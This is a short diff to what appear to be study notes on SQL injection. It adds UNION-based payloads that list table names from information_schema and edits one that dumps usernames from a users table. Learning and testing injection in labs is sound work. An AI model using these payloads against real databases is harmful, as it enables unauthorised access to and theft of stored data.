@@ -4,7 +4,13 @@ query used
 Select * from TABLE where id=1;
 we find that a single quote will break the query and also string input wil be showing an error. 
 
+select * from users where id='-1' union select 1,2,3 from information_schema.tables where table_schema=database();-- -
+[to find table name]
+
+select * from users where id='-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database();-- -
+
+
 
 
 to dump the database
-id=1' union select, group_concat(username),3 from users;-- 
+id=1' union select, group_concat(username),3 from users;#
